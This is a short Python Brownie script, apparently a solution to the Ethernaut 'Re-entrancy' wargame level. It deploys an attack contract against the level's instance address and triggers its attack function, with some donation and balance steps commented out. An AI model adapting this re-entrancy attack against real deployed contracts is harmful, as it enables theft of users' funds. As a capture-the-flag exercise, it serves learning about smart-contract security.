from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0xc734f6B53Ac3b11afdeE4cA1dbFee83521ED267d"
AMOUNT = "0.01 ether"
GAS_LIMIT = 6000000


def main():

    player = get_account()
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})

    # print(f"\nre-entrancy attack successfully deployed\n")

    # # interface.ReentrantInterface(ETHERNAUT_INSTANCE).donate(
    # #     attack.address, {"from": player, "value": AMOUNT}
    # # )
    # target.donate(attack.address, {"from": player, "value": AMOUNT})

    # # the balance of ETHERNAUT_INSTANCE
    # balance_ether = web3.fromWei(target.balance(), "ether")
    # print(f"\nBalance of the attack contract = {balance_ether}\n")

    tx = attack.attack({"from": player, "gas_limit": GAS_LIMIT})
